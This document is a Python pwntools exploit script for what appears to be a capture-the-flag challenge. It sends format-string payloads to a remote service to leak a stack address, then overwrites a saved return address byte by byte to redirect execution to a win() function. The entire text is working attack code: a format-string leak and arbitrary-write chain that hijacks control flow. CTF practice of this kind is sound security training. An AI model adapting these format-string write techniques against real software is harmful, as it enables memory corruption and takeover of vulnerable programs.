from pwn import *

context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

while True:
    r = remote('fun.chall.seetf.sg', 50005)
    r.sendlineafter(b'pokemon: ', b'%112c%7$hhn') # Overwrite battler stored pointer, so that Battle() will be redirected to Play()
    r.sendlineafter(b'pokemon: ', b'%8$p') # Leak the stack address (precisely, the first RBP address)
    out = r.recvuntil(b'\n')
    leak = int(out.split(b',')[0][-2:], 16)
    if leak > 0x60:
        break
target = leak-0x20-0x20-0x20+8 # Our target is the (future) fourth RBP + 8 (fourth call saved return address)
payload = f'%{target}c%8$hhn'.encode() # Third call, we overwrite the 2nd-RBP value from first RBP to (future) fourth RBP + 8
r.sendlineafter(b'pokemon: ', payload)
payload = f'%{0xc6}c%16$hhn'.encode() # Fourth call, we get the 2nd-RBP (which is now points to fourth saved return address), and overwrite its last byte, so that it points to win()
r.sendlineafter(b'pokemon: ', payload)
payload = b'%104c%7$hhn' # Fifth call, fix the battler stored pointer, so that Battle() will call the real Battle()
r.sendlineafter(b'pokemon: ', payload)
r.interactive()
flag = r.recvuntil(b'\n') # The fifth call will continue to fourth call, and the fourth call will return to win() instead to the third call
print(f'Flag: {flag.decode()}')
